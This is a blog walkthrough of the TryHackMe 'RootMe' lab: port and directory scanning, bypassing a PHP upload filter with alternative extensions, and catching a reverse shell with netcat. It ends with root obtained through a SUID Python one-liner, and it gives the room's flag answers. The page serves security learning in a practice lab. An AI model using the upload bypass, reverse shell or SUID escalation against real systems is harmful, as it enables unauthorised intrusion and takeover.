<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel=stylesheet href="/css/style.min.bd29b0727bf7be9a15aa5dfd2b360453a7148cb66ac012583aeb761ce95ddf2f.css" integrity="sha256-vSmwcnv3vpoVql39KzYEU6cUjLZqwBJYOut2HOld3y8=" crossorigin=anonymous><link rel=preload as=font href=/fonts/iosevka.woff2 type=font/woff2 crossorigin=anonymous><link rel=preload as=font href=/fonts/iosevka-bold.woff2 type=font/woff2 crossorigin=anonymous><script>localStorage.getItem("color-theme")==="dark"||!("color-theme"in localStorage)&&window.matchMedia("(prefers-color-scheme: dark)").matches?document.documentElement.classList.add("dark"):document.documentElement.classList.remove("dark")</script><title>TryHackMe - RootMe | r4sso.github.io</title><link rel=icon href=/images/logo.svg></head><body class="bg-cus dark:bg-cus"><header><nav class="navbar fixed top-0 w-full z-50 dark:navbar-dark"><div class="mx-auto max-w-6xl px-2 sm:px-6 lg:px-8"><div class="relative flex h-14 items-center justify-between"><div class="absolute inset-y-0 left-0 flex items-center md:hidden"><button data-collapse-toggle=navbar-default type=button class="inline-flex items-center p-2 w-10 h-10 justify-center text-base text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls=mobile-menu aria-expanded=false>
<span class=sr-only>Open main menu</span>
<svg class="w-5 h-5" aria-hidden="true" fill="none" viewBox="0 0 17 14"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M1 1h15M1 7h15M1 13h15"/></svg></button></div><div class="absolute left-14"><a href=/search><svg class="w-4 h-4 text-gray-500 dark:text-gray-400" aria-hidden="true" fill="none" viewBox="0 0 20 20"><title>Search</title><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m19 19-4-4m0-7A7 7 0 111 8a7 7 0 0114 0z"/></svg>
<span class=sr-only>Search icon</span></a></div><div class="flex flex-1 items-end justify-end md:items-stretch md:justify-start"><div class="flex shrink-0 items-center"><a class=navbar-brand href=https://r4sso.github.io/><img width=26 height=26 src=/images/logo.svg alt=r4sso.github.io></a></div></div><div class="absolute inset-y-0 right-0 flex items-center pr-2 sm:static sm:inset-auto sm:ml-6 sm:pr-0 hidden md:block"><div class="flex space-x-4 tracking-wider text-[15px]"><a class="hover:text-blue-500 py-2 px-0.5 font-semibold" href=https://r4sso.github.io/posts/>Posts</a>
<a class="hover:text-blue-500 py-2 px-0.5 font-semibold" href=https://r4sso.github.io/notes/>Notes</a>
<a class="hover:text-blue-500 py-2 px-0.5 font-semibold" href=https://r4sso.github.io/categories/>Category</a>
<a class="hover:text-blue-500 py-2 px-0.5 font-semibold" href=https://r4sso.github.io/tags/>Tag</a>
<a class="hover:text-blue-500 py-2 px-0.5 font-semibold" href=https://r4sso.github.io/posts/rss.xml>Rss</a>
<a class="hover:text-blue-500 py-2 px-0.5 font-semibold" href=https://r4sso.github.io/about/>?</a></div></div></div></div><div class="md:hidden hidden text-base" id=mobile-menu><div class="space-y-2 px-5 pt-px pb-3 shadow-2xl dark:shadow-blue-500/20"><a class="text-center bg-slate-200 dark:bg-slate-900 hover:text-blue-500 rounded-md block rounded-md py-2 text-base font-semibold tracking-wider" href=https://r4sso.github.io/posts/>Posts</a>
<a class="text-center bg-slate-200 dark:bg-slate-900 hover:text-blue-500 rounded-md block rounded-md py-2 text-base font-semibold tracking-wider" href=https://r4sso.github.io/notes/>Notes</a>
<a class="text-center bg-slate-200 dark:bg-slate-900 hover:text-blue-500 rounded-md block rounded-md py-2 text-base font-semibold tracking-wider" href=https://r4sso.github.io/categories/>Category</a>
<a class="text-center bg-slate-200 dark:bg-slate-900 hover:text-blue-500 rounded-md block rounded-md py-2 text-base font-semibold tracking-wider" href=https://r4sso.github.io/tags/>Tag</a>
<a class="text-center bg-slate-200 dark:bg-slate-900 hover:text-blue-500 rounded-md block rounded-md py-2 text-base font-semibold tracking-wider" href=https://r4sso.github.io/posts/rss.xml>Rss</a>
<a class="text-center bg-slate-200 dark:bg-slate-900 hover:text-blue-500 rounded-md block rounded-md py-2 text-base font-semibold tracking-wider" href=https://r4sso.github.io/about/>?</a></div></div></nav></header><main id=main><div class=pt-12><article class=m-4><div class="prose prose-hr:-my-px prose-hr:my-2 prose-img:rounded-md prose-figcaption:text-center prose-figcaption:text-center prose-figcaption:-my-4 prose-figcaption:font-semibold prose-figcaption:italic dark:prose-invert post-card dark:post-card-dark mx-auto max-w-4xl rounded-lg p-6 shadow-2xl shadow-slate-700/10"><h1 class="-mb-px text-2xl font-bold">TryHackMe - RootMe</h1><p class="mt-2 text-sm text-gray-400">Published on Wednesday, 21 May 2025</p><div class=-my-4><a class="tracking-tighter text-gray-600 text-sm underline underline-offset-4 decoration-1 decoration-gray-400 dark:text-gray-400 hover:no-underline hover:bg-gray-700/10 dark:hover:bg-gray-300/10 p-1 rounded-lg" href=https://r4sso.github.io/tags/tryhackme>#TryHackMe</a></div><div class="prose-h1:text-2xl prose-a:text-blue-600 text-sm leading-normal"><div class=mt-8><details class="rounded-xl border border-gray-200 bg-gray-100 p-1 dark:border-gray-700 dark:bg-slate-900" open><summary class="select-none px-3 py-2 text-sm font-semibold leading-6 text-slate-900 hover:cursor-pointer dark:text-white" aria-expanded=true>Table Of Content</summary><div class="prose-li:my-px prose-ul:mt-px ml-1.5"><nav id=TableOfContents><ul><li><a href=#reconnaissance>Reconnaissance</a></li><li><a href=#getting-a-shell>Getting a shell</a></li><li><a href=#privilege-escalation>Privilege escalation</a></li></ul></nav></div></details></div><p>Room: <a href=https://tryhackme.com/room/rrootme>https://tryhackme.com/room/rrootme</a></p><h2 id=reconnaissance>Reconnaissance</h2><p>Start with an <code>nmap</code> scan to identify open ports and services running on the target:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nmap -sV &lt;ip_addr&gt;
</span></span></code></pre></div><p><figure><a href=/2025/05/tryhackme-rootme/rootme-nmap.png><picture><source srcset=/2025/05/tryhackme-rootme/rootme-nmap_hu_45a3ff7dbf056f6.webp type=image/webp><img src=/2025/05/tryhackme-rootme/rootme-nmap_hu_6e889bab0c724a27.png alt=nmap loading=lazy decoding=async width=764 height=155></picture></a><figcaption>- nmap scan results</figcaption></figure></p><blockquote><p><strong>Scan the machine, how many ports are open?</strong></p><ul><li><code>2</code></li></ul><p><strong>What version of Apache is running?</strong></p><ul><li><code>2.4.29</code></li></ul><p><strong>What service is running on port 22?</strong></p><ul><li><code>ssh</code></li></ul></blockquote><hr><p>Next, use <code>gobuster</code> to enumerate directories on the web server:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster dir -u &lt;url&gt; -w &lt;wordlists&gt;
</span></span></code></pre></div><p><figure><a href=/2025/05/tryhackme-rootme/rootme-gobuster.png><picture><source srcset=/2025/05/tryhackme-rootme/rootme-gobuster_hu_65d0bd1d5e56cdf.webp type=image/webp><img src=/2025/05/tryhackme-rootme/rootme-gobuster_hu_ee77137ee18222de.png alt=rootme-gobuster.png loading=lazy decoding=async width=727 height=309></picture></a></figure></p><blockquote><p><strong>What is the hidden directory?</strong></p><ul><li><code>/panel/</code></li></ul></blockquote><hr><h2 id=getting-a-shell>Getting a shell</h2><p>Browse to <code>/panel/</code></p><p><figure><a href=/2025/05/tryhackme-rootme/rootme-panel.png><picture><source srcset=/2025/05/tryhackme-rootme/rootme-panel_hu_3e65e14d52cb63e5.webp type=image/webp><img src=/2025/05/tryhackme-rootme/rootme-panel_hu_fa898444ed7caa79.png alt=rootme-panel loading=lazy decoding=async width=615 height=548></picture></a></figure></p><p>To exploit this, we can use a PHP reverse shell. Can be found here:</p><blockquote><p><a href=https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php>https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a><br>Make sure to update the shell with your VPN IP and a chosen listening port.</p></blockquote><p><figure><a href=/2025/05/tryhackme-rootme/rootme-panel-denied.png><picture><source srcset=/2025/05/tryhackme-rootme/rootme-panel-denied_hu_e1095b2f18e6754b.webp type=image/webp><img src=/2025/05/tryhackme-rootme/rootme-panel-denied_hu_1bc50203e129d270.png alt=panel-denied loading=lazy decoding=async width=520 height=486></picture></a></figure></p><p>As you can see file with <code>.php</code> seems to be blacklisted</p><p>Try bypass the filter by trying other extensions:</p><blockquote><ul><li><strong>PHP:</strong> <em>.php</em>, <em>.php2</em>, <em>.php3</em>, .<em>php4</em>, .<em>php5</em>, .<em>php6</em>, .<em>php7</em>, .phps, .<em>pht</em>, .<em>phtm, .phtml</em>, .<em>pgif</em>, <em>.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module</em></li><li><strong>Working in PHPv8</strong>: <em>.php</em>, <em>.php4</em>, <em>.php5</em>, <em>.phtml</em>, <em>.module</em>, <em>.inc</em>, <em>.hphp</em>, <em>.ctp</em></li></ul></blockquote><p>Eventually, it succeed</p><p><figure><a href=/2025/05/tryhackme-rootme/rootme-panel-success.png><picture><source srcset=/2025/05/tryhackme-rootme/rootme-panel-success_hu_35cc8c047cca4768.webp type=image/webp><img src=/2025/05/tryhackme-rootme/rootme-panel-success_hu_d69a66af703168ea.png alt=panel-success loading=lazy decoding=async width=453 height=477></picture></a></figure></p><p>From earlier <code>gobuster</code> scan, we know there&rsquo;s an <code>/uploads</code> directory.</p><p><figure><a href=/2025/05/tryhackme-rootme/rootme-uploads.png><picture><source srcset=/2025/05/tryhackme-rootme/rootme-uploads_hu_f405b91dfa260635.webp type=image/webp><img src=/2025/05/tryhackme-rootme/rootme-uploads_hu_b81d6dd09d522e77.png alt=uploads loading=lazy decoding=async width=445 height=244></picture></a></figure></p><p>Listen to port set earlier using <code>netcat</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -lvnp &lt;port&gt;
</span></span></code></pre></div><p>Accessing the uploaded reverse shell file will spawns a shell.</p><p><figure><a href=/2025/05/tryhackme-rootme/rootme-netcat.png><picture><source srcset=/2025/05/tryhackme-rootme/rootme-netcat_hu_28dfc7b2c31e218c.webp type=image/webp><img src=/2025/05/tryhackme-rootme/rootme-netcat_hu_a0e966d676aa571.png alt=netcat loading=lazy decoding=async width=868 height=136></picture></a></figure></p><p>To find <code>user.txt</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>find / -type f -name user.txt 2&gt; /dev/null
</span></span></code></pre></div><p><figure><a href=/2025/05/tryhackme-rootme/rootme-find.png><picture><source srcset=/2025/05/tryhackme-rootme/rootme-find_hu_6edd3f3f6bbdcf99.webp type=image/webp><img src=/2025/05/tryhackme-rootme/rootme-find_hu_8e81498124e56efb.png alt=find loading=lazy decoding=async width=369 height=65></picture></a></figure></p><p>Display the flag:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat /var/www/user.txt
</span></span></code></pre></div><blockquote><p><strong>user.txt</strong> : <code>THM{y0u_g0t_a_sh3ll}</code></p></blockquote><hr><h2 id=privilege-escalation>Privilege escalation</h2><p>To escalate privileges, look for SUID binaries:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>find / -perm -u<span class=o>=</span>s -type f 2&gt;/dev/null
</span></span></code></pre></div><p><figure><a href=/2025/05/tryhackme-rootme/rootme-suid.png><picture><source srcset=/2025/05/tryhackme-rootme/rootme-suid_hu_4a86413a71dca653.webp type=image/webp><img src=/2025/05/tryhackme-rootme/rootme-suid_hu_173315813a299e9c.png alt=suid loading=lazy decoding=async width=351 height=457></picture></a></figure></p><blockquote><p><strong>Search for files with SUID permission, which file is weird?</strong></p><ul><li><code>/usr/bin/python</code></li></ul></blockquote><p>Find a form to escalate your privileges. Searching <a href=https://gtfobins.github.io>GTFOBins</a> shows how to use Python privilege escalation:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python -c <span class=s1>&#39;import os; os.execl(&#34;/bin/sh&#34;, &#34;sh&#34;, &#34;-p&#34;)&#39;</span>
</span></span></code></pre></div><p>Now as root. Find the root.txt:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>find / -type f -name root.txt 2&gt; /dev/null
</span></span></code></pre></div><p><figure><a href=/2025/05/tryhackme-rootme/rootme-root.png><picture><source srcset=/2025/05/tryhackme-rootme/rootme-root_hu_6e1047d2cfb98a7e.webp type=image/webp><img src=/2025/05/tryhackme-rootme/rootme-root_hu_96b98fc1d5592955.png alt=root loading=lazy decoding=async width=456 height=146></picture></a></figure></p><blockquote><p><strong>root.txt</strong><br><code>THM{pr1v1l3g3_3sc4l4t10n}</code></p></blockquote><p class="-mb-2 text-right text-sm">Last edited: <b>21/05/2025 00:00 UTC</b></p></div><div id=giscus-container class=mt-4><script>var giscusTheme=localStorage.getItem("color-theme"),giscusAttributes={src:"https://giscus.app/client.js","data-repo":"r4sso/r4sso.github.io","data-repo-id":"MDEwOlJlcG9zaXRvcnkzMDAyOTQzNzM=","data-category":"Announcements","data-category-id":"DIC_kwDOEeYg5c4CX55V","data-mapping":"pathname","data-reactions-enabled":"1","data-input-position":"top","data-emit-metadata":"0","data-strict":"0","data-theme":giscusTheme,"data-lang":"en","data-loading":"lazy",crossorigin:"anonymous",async:""},giscusScript=document.createElement("script");Object.entries(giscusAttributes).forEach(([e,t])=>giscusScript.setAttribute(e,t)),document.getElementById("giscus-container").appendChild(giscusScript)</script></div></div></article></div><footer class="inset-x-0 bottom-0 text-center p-8"><span class="items-start text-sm text-gray-500">&copy; 2025 <b><a href=https://r4sso.github.io/>r4sso.github.io</a></b></span></footer><div class="bg-slate-200 dark:bg-gray-800 rounded-full fixed bottom-8 right-8"><button id=scroll-to-top class="rounded-full p-3 hidden text-black dark:text-white mb-1" onclick=scrollToTop() aria-label="Back to top">
<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-up w-4 h-4"><path d="M18 15l-6-6-6 6"/></svg>
</button>
<button id=theme-toggle type=button class="text-blue-500 dark:text-yellow-500 rounded-full text-sm p-3" aria-label="Toggle theme">
<svg id="theme-toggle-dark-icon" class="hidden w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001.0 1010.586 10.586z"/></svg>
<svg id="theme-toggle-light-icon" class="hidden w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path d="M10 2a1 1 0 011 1v1A1 1 0 119 4V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707A1 1 0 1113.536 5.05l.707-.707a1 1 0 011.414.0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707A1 1 0 004.343 5.757l.707.707zm1.414 8.486-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" fill-rule="evenodd" clip-rule="evenodd"/></svg></button></div></main><script src=/js/script.min.791d61189f25c9deecf3baf1d28eefa6f2bf494345abdcf37bdc901d1f5f8b8b.js integrity="sha256-eR1hGJ8lyd7s87rx0o7vpvK/SUNFq9zze9yQHR9fi4s=" crossorigin=anonymous></script></body></html>